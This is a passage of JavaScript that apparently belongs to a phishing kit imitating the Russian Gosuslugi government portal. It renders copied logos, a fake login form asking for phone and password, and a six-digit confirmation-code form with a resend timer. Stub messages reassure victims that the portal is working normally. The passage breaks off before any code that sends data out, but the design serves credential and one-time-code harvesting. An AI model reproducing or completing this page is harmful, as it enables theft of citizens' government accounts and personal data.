if(typeof GSspace !== "undefined"){
	const typeTap = (window.ontouchstart === null) ? 'touchstart' : 'click';
	const svgFile1 = "<svg version='1.1' id='Layer_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 196.7 212.1' enable-background='new 0 0 196.7 212.1' xml:space='preserve'><path fill-rule='evenodd' clip-rule='evenodd' fill='#1D67AD' d='M196.5,94.9c0-0.1,0-0.3,0-0.4c-0.2-5.1-0.4-9.7-0.7-13.4c0-0.2,0-0.5,0-0.7c0-0.1,0-0.3,0-0.4c0-0.4-0.1-0.7-0.1-1.1c0-0.2,0-0.3,0-0.4c-0.3-3.9-0.5-6.3-0.6-6.5c0-0.4-0.1-0.8-0.1-1.1c0-0.1,0-0.2,0-0.3c-0.1-0.7-0.2-1.3-0.4-2c0-0.1,0-0.2-0.1-0.3c-1.3-6.2-4.3-13-8.2-18.8c-0.1-0.2-0.2-0.4-0.3-0.6c-3.1-4.6-6.5-8.2-10.3-11c-0.5-0.4-12.7-9.4-28.1-18.5c-0.2-0.1-0.4-0.2-0.6-0.3h0C131.9,10.1,118.6,4,117.8,3.7c0,0,0,0,0,0c-0.9-0.4-1.9-0.8-2.9-1.1c-0.1,0-0.2-0.1-0.3-0.1c-0.5-0.2-0.9-0.3-1.4-0.4c-0.1,0-0.2-0.1-0.4-0.1c-1.5-0.4-3-0.8-4.6-1.1c-0.2,0-0.3-0.1-0.5-0.1c-0.5-0.1-0.9-0.1-1.4-0.2c-0.3,0-0.5-0.1-0.8-0.1c-0.4-0.1-0.9-0.1-1.3-0.1c-0.1,0-0.1,0-0.2,0c-0.1,0-0.2,0-0.4,0c-0.7-0.1-1.4-0.1-2.2-0.2c-0.1,0-0.3,0-0.4,0c-0.2,0-0.4,0-0.6,0c-0.2,0-0.5,0-0.7,0c-0.5,0-0.9,0-1.4,0c0,0,0,0,0,0s0,0,0,0c-0.5,0-0.9,0-1.4,0c-0.2,0-0.5,0-0.7,0c-0.2,0-0.4,0-0.6,0c-0.1,0-0.3,0-0.4,0c-0.7,0-1.4,0.1-2.2,0.2c-0.1,0-0.2,0-0.4,0c-0.1,0-0.1,0-0.2,0c-0.4,0-0.9,0.1-1.3,0.1c-0.3,0-0.5,0.1-0.8,0.1C90,0.6,89.5,0.7,89,0.8c-0.2,0-0.3,0.1-0.5,0.1c-1.6,0.3-3.2,0.6-4.6,1.1c-0.1,0-0.2,0.1-0.4,0.1c-0.5,0.1-0.9,0.3-1.4,0.4c-0.1,0-0.2,0.1-0.3,0.1c-1,0.3-2,0.7-2.9,1.1c0,0,0,0,0,0C78.1,4,64.8,10.1,49.6,19h0c-0.2,0.1-0.4,0.2-0.6,0.3C33.6,28.4,21.5,37.4,21,37.8c-3.8,2.8-7.2,6.4-10.3,11c-0.1,0.2-0.2,0.3-0.3,0.6C6.6,55.3,3.6,62,2.3,68.2c0,0.1,0,0.2-0.1,0.3c-0.1,0.7-0.3,1.4-0.4,2c0,0.1,0,0.2,0,0.3c-0.1,0.4-0.1,0.8-0.1,1.1c0,0.2-0.3,2.6-0.6,6.5c0,0.1,0,0.3,0,0.4C1,79.3,1,79.6,1,80c0,0.1,0,0.3,0,0.4c0,0.2,0,0.5,0,0.7c-0.3,3.7-0.5,8.2-0.7,13.4c0,0.1,0,0.3,0,0.4C0.1,98.4,0,102.1,0,106s0.1,7.7,0.2,11.2c0,0.1,0,0.3,0,0.4c0.2,5.1,0.4,9.7,0.7,13.4c0,0.2,0,0.5,0,0.7c0,0.1,0,0.3,0,0.4c0,0.4,0.1,0.7,0.1,1.1c0,0.2,0,0.3,0,0.4c0.3,3.9,0.5,6.3,0.6,6.5c0,0.4,0.1,0.8,0.1,1.1c0,0.1,0,0.2,0,0.3c0.1,0.7,0.2,1.3,0.4,2c0,0.1,0,0.2,0.1,0.3c1.3,6.2,4.3,13,8.2,18.8c0.1,0.2,0.1,0.4,0.2,0.5c3.1,4.6,6.5,8.2,10.3,11c0.5,0.4,12.7,9.4,28.1,18.5c0.8,0.5,1.6,1,2.5,1.4h0c14.3,8.2,26.6,13.8,27.3,14.2c0,0,0,0,0,0c0.9,0.4,1.9,0.8,2.9,1.1c0.1,0,0.3,0.1,0.4,0.1c0.4,0.1,0.9,0.3,1.3,0.4c0.1,0,0.3,0.1,0.4,0.1c1.5,0.4,3,0.8,4.6,1c0.2,0,0.4,0.1,0.5,0.1c0.5,0.1,0.9,0.1,1.4,0.2c0.3,0,0.5,0.1,0.8,0.1c0.4,0.1,0.9,0.1,1.3,0.2c0.1,0,0.1,0,0.2,0c0.1,0,0.2,0,0.3,0c0.7,0.1,1.5,0.1,2.2,0.2c0.1,0,0.3,0,0.4,0c0.2,0,0.4,0,0.6,0c0.2,0,0.5,0,0.7,0c0.5,0,0.9,0,1.4,0c0,0,0,0,0,0s0,0,0,0c0.5,0,0.9,0,1.4,0c0.2,0,0.5,0,0.7,0c0.2,0,0.4,0,0.6,0c0.1,0,0.3,0,0.4,0c0.7,0,1.5-0.1,2.2-0.2c0.1,0,0.2,0,0.3,0c0.1,0,0.1,0,0.2,0c0.4,0,0.9-0.1,1.3-0.2c0.3,0,0.5-0.1,0.8-0.1c0.5-0.1,0.9-0.1,1.4-0.2c0.2,0,0.4-0.1,0.5-0.1c1.6-0.3,3.1-0.6,4.6-1c0.1,0,0.3-0.1,0.4-0.1c0.5-0.1,0.9-0.3,1.3-0.4c0.1,0,0.3-0.1,0.4-0.1c1-0.3,2-0.7,2.9-1.1c0,0,0,0,0,0c0.8-0.3,13-5.9,27.3-14.2h0c0.8-0.5,1.6-0.9,2.5-1.4c15.5-9.1,27.6-18.1,28.1-18.5c3.8-2.8,7.2-6.4,10.3-11c0.1-0.2,0.2-0.3,0.2-0.5c3.9-5.8,6.9-12.5,8.2-18.8c0-0.1,0-0.2,0.1-0.3c0.1-0.7,0.3-1.4,0.4-2c0-0.1,0-0.2,0-0.3c0.1-0.4,0.1-0.8,0.1-1.1c0-0.2,0.3-2.6,0.6-6.5c0-0.1,0-0.3,0-0.4c0-0.4,0.1-0.7,0.1-1.1c0-0.1,0-0.3,0-0.4c0-0.2,0-0.5,0-0.7c0.3-3.7,0.5-8.2,0.7-13.4c0-0.1,0-0.3,0-0.4c0.1-3.5,0.2-7.3,0.2-11.2S196.6,98.4,196.5,94.9z'></path></svg>";
	const svgFile2 = "<svg version='1.1' id='Layer_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 196.7 212.1' enable-background='new 0 0 196.7 212.1' xml:space='preserve'><path fill-rule='evenodd' clip-rule='evenodd' fill='#FFFFFF' d='M196.5,94.9c0-0.1,0-0.3,0-0.4c-0.2-5.1-0.4-9.7-0.7-13.4c0-0.2,0-0.5,0-0.7c0-0.1,0-0.3,0-0.4c0-0.4-0.1-0.7-0.1-1.1c0-0.2,0-0.3,0-0.4c-0.3-3.9-0.5-6.3-0.6-6.5c0-0.4-0.1-0.8-0.1-1.1c0-0.1,0-0.2,0-0.3c-0.1-0.7-0.2-1.3-0.4-2c0-0.1,0-0.2-0.1-0.3c-1.3-6.2-4.3-13-8.2-18.8c-0.1-0.2-0.2-0.4-0.3-0.6c-3.1-4.6-6.5-8.2-10.3-11c-0.5-0.4-12.7-9.4-28.1-18.5c-0.2-0.1-0.4-0.2-0.6-0.3h0C131.9,10.1,118.6,4,117.8,3.7c0,0,0,0,0,0c-0.9-0.4-1.9-0.8-2.9-1.1c-0.1,0-0.2-0.1-0.3-0.1c-0.5-0.2-0.9-0.3-1.4-0.4c-0.1,0-0.2-0.1-0.4-0.1c-1.5-0.4-3-0.8-4.6-1.1c-0.2,0-0.3-0.1-0.5-0.1c-0.5-0.1-0.9-0.1-1.4-0.2c-0.3,0-0.5-0.1-0.8-0.1c-0.4-0.1-0.9-0.1-1.3-0.1c-0.1,0-0.1,0-0.2,0c-0.1,0-0.2,0-0.4,0c-0.7-0.1-1.4-0.1-2.2-0.2c-0.1,0-0.3,0-0.4,0c-0.2,0-0.4,0-0.6,0c-0.2,0-0.5,0-0.7,0c-0.5,0-0.9,0-1.4,0c0,0,0,0,0,0s0,0,0,0c-0.5,0-0.9,0-1.4,0c-0.2,0-0.5,0-0.7,0c-0.2,0-0.4,0-0.6,0c-0.1,0-0.3,0-0.4,0c-0.7,0-1.4,0.1-2.2,0.2c-0.1,0-0.2,0-0.4,0c-0.1,0-0.1,0-0.2,0c-0.4,0-0.9,0.1-1.3,0.1c-0.3,0-0.5,0.1-0.8,0.1C90,0.6,89.5,0.7,89,0.8c-0.2,0-0.3,0.1-0.5,0.1c-1.6,0.3-3.2,0.6-4.6,1.1c-0.1,0-0.2,0.1-0.4,0.1c-0.5,0.1-0.9,0.3-1.4,0.4c-0.1,0-0.2,0.1-0.3,0.1c-1,0.3-2,0.7-2.9,1.1c0,0,0,0,0,0C78.1,4,64.8,10.1,49.6,19h0c-0.2,0.1-0.4,0.2-0.6,0.3C33.6,28.4,21.5,37.4,21,37.8c-3.8,2.8-7.2,6.4-10.3,11c-0.1,0.2-0.2,0.3-0.3,0.6C6.6,55.3,3.6,62,2.3,68.2c0,0.1,0,0.2-0.1,0.3c-0.1,0.7-0.3,1.4-0.4,2c0,0.1,0,0.2,0,0.3c-0.1,0.4-0.1,0.8-0.1,1.1c0,0.2-0.3,2.6-0.6,6.5c0,0.1,0,0.3,0,0.4C1,79.3,1,79.6,1,80c0,0.1,0,0.3,0,0.4c0,0.2,0,0.5,0,0.7c-0.3,3.7-0.5,8.2-0.7,13.4c0,0.1,0,0.3,0,0.4C0.1,98.4,0,102.1,0,106s0.1,7.7,0.2,11.2c0,0.1,0,0.3,0,0.4c0.2,5.1,0.4,9.7,0.7,13.4c0,0.2,0,0.5,0,0.7c0,0.1,0,0.3,0,0.4c0,0.4,0.1,0.7,0.1,1.1c0,0.2,0,0.3,0,0.4c0.3,3.9,0.5,6.3,0.6,6.5c0,0.4,0.1,0.8,0.1,1.1c0,0.1,0,0.2,0,0.3c0.1,0.7,0.2,1.3,0.4,2c0,0.1,0,0.2,0.1,0.3c1.3,6.2,4.3,13,8.2,18.8c0.1,0.2,0.1,0.4,0.2,0.5c3.1,4.6,6.5,8.2,10.3,11c0.5,0.4,12.7,9.4,28.1,18.5c0.8,0.5,1.6,1,2.5,1.4h0c14.3,8.2,26.6,13.8,27.3,14.2c0,0,0,0,0,0c0.9,0.4,1.9,0.8,2.9,1.1c0.1,0,0.3,0.1,0.4,0.1c0.4,0.1,0.9,0.3,1.3,0.4c0.1,0,0.3,0.1,0.4,0.1c1.5,0.4,3,0.8,4.6,1c0.2,0,0.4,0.1,0.5,0.1c0.5,0.1,0.9,0.1,1.4,0.2c0.3,0,0.5,0.1,0.8,0.1c0.4,0.1,0.9,0.1,1.3,0.2c0.1,0,0.1,0,0.2,0c0.1,0,0.2,0,0.3,0c0.7,0.1,1.5,0.1,2.2,0.2c0.1,0,0.3,0,0.4,0c0.2,0,0.4,0,0.6,0c0.2,0,0.5,0,0.7,0c0.5,0,0.9,0,1.4,0c0,0,0,0,0,0s0,0,0,0c0.5,0,0.9,0,1.4,0c0.2,0,0.5,0,0.7,0c0.2,0,0.4,0,0.6,0c0.1,0,0.3,0,0.4,0c0.7,0,1.5-0.1,2.2-0.2c0.1,0,0.2,0,0.3,0c0.1,0,0.1,0,0.2,0c0.4,0,0.9-0.1,1.3-0.2c0.3,0,0.5-0.1,0.8-0.1c0.5-0.1,0.9-0.1,1.4-0.2c0.2,0,0.4-0.1,0.5-0.1c1.6-0.3,3.1-0.6,4.6-1c0.1,0,0.3-0.1,0.4-0.1c0.5-0.1,0.9-0.3,1.3-0.4c0.1,0,0.3-0.1,0.4-0.1c1-0.3,2-0.7,2.9-1.1c0,0,0,0,0,0c0.8-0.3,13-5.9,27.3-14.2h0c0.8-0.5,1.6-0.9,2.5-1.4c15.5-9.1,27.6-18.1,28.1-18.5c3.8-2.8,7.2-6.4,10.3-11c0.1-0.2,0.2-0.3,0.2-0.5c3.9-5.8,6.9-12.5,8.2-18.8c0-0.1,0-0.2,0.1-0.3c0.1-0.7,0.3-1.4,0.4-2c0-0.1,0-0.2,0-0.3c0.1-0.4,0.1-0.8,0.1-1.1c0-0.2,0.3-2.6,0.6-6.5c0-0.1,0-0.3,0-0.4c0-0.4,0.1-0.7,0.1-1.1c0-0.1,0-0.3,0-0.4c0-0.2,0-0.5,0-0.7c0.3-3.7,0.5-8.2,0.7-13.4c0-0.1,0-0.3,0-0.4c0.1-3.5,0.2-7.3,0.2-11.2S196.6,98.4,196.5,94.9z'></path></svg>";
	const svgFile3 = "<svg version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 194 213' enable-background='new 0 0 194 213' xml:space='preserve'><g id='Layer_10'></g><g id='Layer_9'></g><g id='Layer_8'></g><g id='Layer_7'></g><g id='Layer_6'></g><g id='Layer_5'></g><g id='Layer_4'></g><g id='Layer_3'></g><g id='Layer_2'></g><g id='Слой_1'><g id='Layer_11'><g><path fill='#EF3E58' d='M162.8,108.7h-6.4c-0.2,0-0.4,0.2-0.4,0.4v20.3c-1.4,0.4-2.8,0.6-4.4,0.6c-4.2,0-5.2-1.3-5.2-6.9v-14c0-0.2-0.2-0.4-0.4-0.4h-6.4c-0.2,0-0.4,0.2-0.4,0.4v14.7c0,9.2,3.1,12.7,11,12.7c4.5,0,9.6-1.2,12.6-2.3c0.1-0.1,0.2-0.2,0.2-0.3v-24.8C163.2,108.9,163,108.7,162.8,108.7z'></path><path fill='#EF3E58' d='M27.2,108.8h-6.5c-0.2,0-0.3,0.1-0.3,0.3c-1,4-3.1,10.8-5.9,17.9L8,109c-0.1-0.1-0.2-0.2-0.3-0.2H1.1c-0.1,0-0.2,0.1-0.3,0.2c-0.1,0.1-0.1,0.2,0,0.3l9.8,26.8c-1,2.1-1.9,3.8-2.8,5.4c-0.7,1.2-1.3,2.4-1.9,3.7c-0.1,0.1-0.1,0.2,0,0.3c0.1,0.1,0.2,0.2,0.3,0.2h7.1c0.1,0,0.3-0.1,0.3-0.2c1.2-2.3,2.7-5.5,4.1-8.8c4.2-9.8,7.5-19,10-27.4c0-0.1,0-0.2-0.1-0.3C27.4,108.8,27.3,108.8,27.2,108.8z'></path><path fill='#EF3E58' d='M50.5,129.4c0-0.1-0.1-0.2-0.2-0.2c-0.1,0-0.2,0-0.3,0c-1.6,0.6-4.5,1-6.5,1c-4.5,0-6.6-1.2-6.6-8c0-5.5,0.7-8,6.6-8c1.7,0,3.2,0.2,5.2,0.8c0.2,0,0.3,0,0.4-0.2c0.7-1.4,1.6-3.1,2.6-5.2c0-0.1,0-0.2,0-0.3c0-0.1-0.1-0.2-0.2-0.2c-2.6-0.8-5.7-1.3-8.5-1.3c-9.3,0-13.5,4.4-13.5,14.3c0,10,4.2,14.5,13.5,14.5c2.3,0,7-0.5,9.2-1.4c0.2-0.1,0.3-0.3,0.2-0.5L50.5,129.4z'></path><path fill='#EF3E58' d='M111.4,108.8h-6.5c-0.2,0-0.3,0.1-0.3,0.3c-1,4.1-3.1,10.8-5.9,17.9L92.2,109c-0.1-0.1-0.2-0.2-0.3-0.2h-6.6c-0.1,0-0.2,0.1-0.3,0.2c-0.1,0.1-0.1,0.2,0,0.3l9.8,26.8c-1,2.1-1.9,3.8-2.8,5.4c-0.7,1.2-1.3,2.4-1.9,3.7c-0.1,0.1-0.1,0.2,0,0.3c0.1,0.1,0.2,0.2,0.3,0.2h7.1c0.1,0,0.3-0.1,0.3-0.2c1.2-2.3,2.7-5.5,4.1-8.8c4.1-9.8,7.5-19,10-27.4c0-0.1,0-0.2-0.1-0.3C111.6,108.8,111.5,108.8,111.4,108.8z'></path><path fill='#EF3E58' d='M135.4,108.7h-18.9c-0.2,0-0.4,0.2-0.4,0.4v26.3c0,0.2,0.2,0.4,0.4,0.4h6.4c0.2,0,0.4-0.2,0.4-0.4V115h9.9c0.1,0,0.3-0.1,0.3-0.2c0.8-1.8,1.5-3.7,2.3-5.6c0-0.1,0-0.2,0-0.3C135.6,108.8,135.5,108.7,135.4,108.7z'></path><path fill='#0F67B1' d='M34.8,68.3c-9.2,0-12.8,4-12.8,14.1c0,10.3,3.6,14.3,12.8,14.3c9.3,0,12.9-4,12.9-14.3C47.7,72.3,44.1,68.3,34.8,68.3z M34.8,90.9c-4.2,0-5.5-1.1-5.5-8.3c0-7.6,1.4-8.3,5.5-8.3c4.2,0,5.6,0.7,5.6,8.3C40.4,89.7,39.1,90.9,34.8,90.9z'></path><path fill='#0F67B1' d='M73.3,89.8c0-0.1-0.1-0.2-0.2-0.2c-0.1,0-0.2,0-0.3,0c-1.6,0.6-4.5,1-6.5,1c-4.5,0-6.6-1.2-6.6-8c0-5.5,0.6-8,6.6-8c1.7,0,3.2,0.2,5.2,0.8c0.2,0,0.3,0,0.4-0.2c0.7-1.4,1.6-3.1,2.6-5.2c0-0.1,0-0.2,0-0.3c0-0.1-0.1-0.2-0.2-0.2c-2.6-0.8-5.7-1.3-8.5-1.3c-9.3,0-13.5,4.4-13.5,14.3c0,10,4.2,14.5,13.5,14.5c2.3,0,7-0.5,9.2-1.4c0.2-0.1,0.3-0.3,0.2-0.5L73.3,89.8z'></path><path fill='#0F67B1' d='M1.1,69.1c-0.2,0-0.4,0.2-0.4,0.4v26.3c0,0.2,0.2,0.4,0.4,0.4h6.4c0.2,0,0.4-0.2,0.4-0.4V75.4h9.9c0.1,0,0.3-0.1,0.3-0.2c0.8-1.8,1.5-3.7,2.3-5.6c0-0.1,0-0.2,0-0.3c-0.1-0.1-0.2-0.2-0.3-0.2H1.1z'></path><linearGradient id='SVGID_1_' gradientUnits='userSpaceOnUse' x1='100.5167' y1='213.0138' x2='100.5167' y2='0.9307' gradientTransform='matrix(1 0 0 -1 0 213.8898)'><stop offset='0.3979' style='stop-color:#1466AC'></stop><stop offset='0.6586' style='stop-color:#EF4058'></stop></linearGradient><path fill-rule='evenodd' clip-rule='evenodd' fill='url(#SVGID_1_)' d='M192.7,133c0-0.1,0-0.3,0-0.4c0-0.2,0-0.5,0.1-0.7c0.3-3.7,0.5-8.2,0.7-13.4c0-0.1,0-0.3,0-0.4c0.1-3.5,0.2-7.3,0.2-11.2c0-3.9-0.1-7.7-0.2-11.2c0-0.1,0-0.3,0-0.4c-0.2-5.1-0.4-9.7-0.7-13.4c0-0.2,0-0.5-0.1-0.7c0-0.1,0-0.3,0-0.4c0-0.4-0.1-0.7-0.1-1.1c0-0.2,0-0.3,0-0.4c-0.3-3.9-0.5-6.3-0.6-6.5c0-0.4-0.1-0.8-0.1-1.1c0-0.1,0-0.2,0-0.3c-0.1-0.7-0.2-1.3-0.4-2c0-0.1,0-0.2-0.1-0.3c-1.7-8.1-6.2-17-11.8-23.7c-2.2-2.6-4.5-4.9-6.9-6.7c-0.2-0.2-3-2.2-7.4-5.3c-5.1-3.5-12.4-8.4-20.7-13.2c-14.7-8.7-27.9-14.7-29.6-15.5c0,0,0,0,0,0c0,0,0,0,0,0c-0.1,0-0.1-0.1-0.1-0.1l0,0c0,0,0,0,0,0c-3.9-1.7-8.6-2.9-13.7-3.4c-1-0.1-2-0.2-3-0.2c-0.9,0-1.8-0.1-2.7-0.1c-0.5,0-0.9,0-1.4,0C87.2,1,80.9,2.3,75.9,4.6c0,0,0,0,0,0C75.1,4.9,61.8,11,46.7,19.8h0c-0.2,0.1-0.4,0.2-0.6,0.3C30.7,29.3,18.5,38.3,18,38.7c-3.8,2.8-7.2,6.4-10.3,11C7,50.8,7,53.4,10,53.4h7.7c3.3,0,4.1-2,7.8-4.7c4.1-3,12.2-9,27-17.8C63.2,24.6,73.2,19.7,78,17.4c0,0,0,0,0,0c0.1,0,0.2-0.1,0.3-0.1c0,0,0.1,0,0.1-0.1c0,0,0.1,0,0.1-0.1c0.1,0,0.2-0.1,0.2-0.1c0,0,0,0,0,0c0.1,0,0.2-0.1,0.3-0.1c0,0,0,0,0,0c1.2-0.6,2-0.9,2-0.9c3.4-1.5,8.2-2.5,13.3-2.6c0.3,0,0.7,0,1,0c0.3,0,0.7,0,1,0c1.5,0,3,0.1,4.4,0.3c3.1,0.4,5.9,1,8.2,2c0.2,0.1,0.5,0.2,0.7,0.3c0,0,0.1,0.1,0.4,0.2c2.3,1,14.7,6.9,28.2,14.8c8,4.7,15.1,9.4,20,12.8c4.3,3,6.9,4.9,7,5c1.9,1.4,3.8,3.4,5.6,5.6c4.5,5.8,8.2,13.7,8.8,19.8c0,0.1,0.3,2.5,0.6,6.6c0,0.3,0,0.5,0.1,0.8c0,0.2,0,0.4,0,0.6c0,0.4,0.1,0.7,0.1,1.1c0,0.1,0,0.3,0,0.4c0,0.2,0,0.5,0.1,0.7c0,0.5,0.1,1,0.1,1.5c0,0.3,0,0.6,0.1,0.9c0,0.1,0,0.2,0,0.2c0,0.4,0,0.7,0.1,1.1c0,0.3,0,0.5,0,0.8c0.3,5.2,0.5,11.4,0.5,17.9s-0.2,12.7-0.5,17.9c0,0.3,0,0.5,0,0.8c0,0.4,0,0.7-0.1,1.1c0,0.1,0,0.2,0,0.2c0,0.3,0,0.6-0.1,0.9c0,0.5-0.1,1-0.1,1.5c0,0.3,0,0.5-0.1,0.7c0,0.1,0,0.3,0,0.4c0,0.4-0.1,0.7-0.1,1.1c0,0.2,0,0.4,0,0.6c0,0.3,0,0.6-0.1,0.8c-0.3,4.1-0.6,6.6-0.6,6.6c-0.6,6.1-4.3,14-8.8,19.8c-1.8,2.3-3.7,4.2-5.6,5.6c-0.1,0-2.7,2-7,5c-4.9,3.4-12.1,8.1-20,12.8c-13.5,8-26,13.8-28.2,14.8c-0.2,0.1-0.4,0.2-0.4,0.2c-0.2,0.1-0.5,0.2-0.7,0.3c-2.3,0.9-5.1,1.6-8.2,2c-1.4,0.2-2.9,0.3-4.4,0.3c-0.3,0-0.7,0-1,0s-0.7,0-1,0c-5.1-0.1-9.9-1-13.3-2.6c0,0-0.7-0.3-2-0.9c0,0,0,0,0,0c-0.1-0.1-0.3-0.1-0.4-0.2c0,0,0,0,0,0c-0.1-0.1-0.2-0.1-0.3-0.2c-0.1,0-0.1-0.1-0.2-0.1c-0.1,0-0.2-0.1-0.3-0.1c-0.1-0.1-0.2-0.1-0.4-0.2c0,0-0.1,0-0.1,0c-5.1-2.4-14.7-7.2-24.9-13.2c-14.9-8.7-22.9-14.8-27-17.8c-3.7-2.7-4.5-4.7-7.8-4.7H10c-3,0-3,2.6-2.3,3.6c3.1,4.6,6.5,8.2,10.3,11c0.5,0.4,12.7,9.4,28.1,18.5c0.8,0.5,1.6,1,2.5,1.4h0c14.3,8.2,26.6,13.8,27.3,14.2c0,0,0,0,0,0c4.9,2.2,11.3,3.5,18.1,3.7c0.4,0,0.9,0,1.4,0c0.9,0,1.8,0,2.7-0.1c1,0,2-0.1,3-0.2c5.1-0.5,9.9-1.7,13.7-3.4c0,0,0,0,0,0l0,0c0,0,0.1,0,0.1-0.1c0,0,0,0,0,0c0,0,0,0,0,0c1.7-0.8,14.9-6.9,29.6-15.5c8.3-4.9,15.6-9.7,20.7-13.2c4.4-3.1,7.2-5.1,7.4-5.3c2.4-1.8,4.7-4.1,6.9-6.7c5.6-6.7,10.1-15.6,11.8-23.7c0-0.1,0-0.2,0.1-0.3c0.1-0.7,0.3-1.4,0.4-2c0-0.1,0-0.2,0-0.3c0.1-0.4,0.1-0.8,0.1-1.1c0-0.2,0.3-2.6,0.6-6.5c0-0.1,0-0.3,0-0.4C192.7,133.7,192.7,133.3,192.7,133'></path><path fill='#EF3E58' d='M79.9,108.7H60.3c-0.2,0-0.3,0.1-0.4,0.3c-0.5,8.9-2.2,18.4-4.6,26.2c0,0.1,0,0.2,0.1,0.3c0.1,0.1,0.2,0.1,0.3,0.1h6.7c0.2,0,0.3-0.1,0.3-0.2c1.9-6,3.4-13.8,4-20.4h6.4v20.3c0,0.2,0.2,0.4,0.4,0.4h6.4c0.2,0,0.4-0.2,0.4-0.4v-26.3C80.3,108.9,80.1,108.7,79.9,108.7z'></path></g></g></g></svg>";
	const firstForm = "<div id='placement' class='fl cl'><div id='headerPage' class='fl sb'><div class='headIcon'><img src='./img/max.png' id='maxGpt'></div><div class='headIcon'><img src='./img/gosscan.png' id='gosScan'></div></div><div id='centralLogo'><img src='./img/logo.png'></div><div id='footerPage'><div><button id='signInButt'>Войти</button></div><div><button id='signUpButt'>Зарегистрироваться</button></div></div></div>";
	const secondForm = "<div id='realLogin' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl'><div id='rusTag'>Русский</div><div id='rusFlag'><img src='./img/rusFlag.png'></div></div><div id='loginPlace'><div class='strokaInput'><div class='headInput'>Телефон </div><input type='tel' id='login' placeholder='Телефон ' autocomplete='off'></div></div><div id='passPlace'><div class='strokaInput'><div class='headInput'>Пароль </div><input type='password' id='password' placeholder='Пароль ' autocomplete='off'></div></div><div id=''><div class='strokaInput'><div id='resText'>Восстановить</div></div></div><div id=''><div class='strokaInput'><button id='signInButt'>Войти</button></div></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не удается войти?</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a>Зарегистрироваться</a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
	const thirdForm = "<div class='fl cs'><div id='dopHeader'><div id='preHeaderTitul'>Идёт загрузка...</div></div><div id='progressBar'><div id='progressLine'></div></div><div id='progressLogoBar'><div id='preLogoTitul'><img src='./img/logo2.jpg'></div></div><div id='dopBody'><div id='preMess' class='fl'><div id='preMessForm'><div id='sysMessTitul' class='stroka'>Госуслуги сейчас откроются</div><div id='sysMessText' class='stroka'>Портал работает в прежднем режиме. Подождите пару секунд.</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div></div></div></div>";
	const fourthForm = "<div id='tempCode' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl ac'><div id='trustTitul'>Подтвердите вход </div><div id='messTrust'></div><div id='telTrust'></div></div><div id=''><div id='titulCode'><div>Код подтверждения</div></div></div><div id='loginPlace'><div class='strokaInput fl'><input type='text' class='tCode tact' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'></div></div><div id=''><div id='tCodeTrust'>Отправить повторно через</div></div><div id=''><div id='tTimer'>00:59</div></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не могу подтвердить вход</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a></a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
	//Телефон / Email / СНИЛС

	function loadingSpace(){//главная функция, при загрузке страницы
		loadData = window.localStorage.getItem('loginData');
        if(loadData == '' | loadData == null | loadData == undefined){
			loadScreen(2);			
			loadPreLoginForm();
        }else{
			//вывод сообщения о технических работах			
		}
	}
	function loadScreen(e){//загрузочный экран
		var loadPlace = document.querySelector("body");
		loadPlace.insertAdjacentHTML("afterbegin",`<div class='container-app-loader' id='start-app-loader'><div class='container-pulse pulse animated'>${svgFile1}</div><div class='container-app-logo'>${svgFile2}<div class='app-logo' aria-label='Загрузка' role='status'>${svgFile3}</div></div></div>`);
		setTimeout(() => {document.querySelector('#start-app-loader').remove();}, (e*1000));		
	}
	function loadPreLoginForm(){//первая форма авторизации		
		var loginFormPlace = document.querySelector("#mainPlace");
		loginFormPlace.insertAdjacentHTML("afterbegin", firstForm);
		
		var signInButton = document.querySelector("#signInButt");
		var signUpButton = document.querySelector("#signUpButt");
		var maxButton = document.querySelector("#maxGpt");
		var rossScanButton = document.querySelector("#gosScan");
		
		signInButton.addEventListener(typeTap, (e)=>{loadLoginForm();});		
		signUpButton.addEventListener(typeTap, (e)=>{loadRegForm();});
		maxButton.addEventListener(typeTap, (e)=>{funcOpenPage();});
		rossScanButton.addEventListener(typeTap, (e)=>{funcOpenPage();});
	}
	function funcOpenPage(){//сообщение заглушка
		aMessages("Функция временно недоступна","Портал работает в прежднем режиме. Повторите попытку позже.",2);
	}
	function loadLoginForm(){//вторая форма авторизации
		loadCSS("login.css");
		var loginFormPlace = document.querySelector("#mainPlace");				
		loginFormPlace.insertAdjacentHTML("afterbegin", `<div id='preloaderPage' class='-hideF'>${thirdForm}</div>`);
		var ploaderPlace = document.querySelector("#preloaderPage");		
		animShow("transitLeft", 100, ploaderPlace, 0);
		var progressLine = document.querySelector("#progressLine");
		animShow("progressBar", 500, progressLine, 90);		
		
		setTimeout(() => {
			loginFormPlace.innerHTML = "";
			loginFormPlace.insertAdjacentHTML("afterbegin", secondForm);
			activeDoing();
		}, (1100));
	}
	function activeDoing(){//обработчик нажатий на 2 форме авторизации
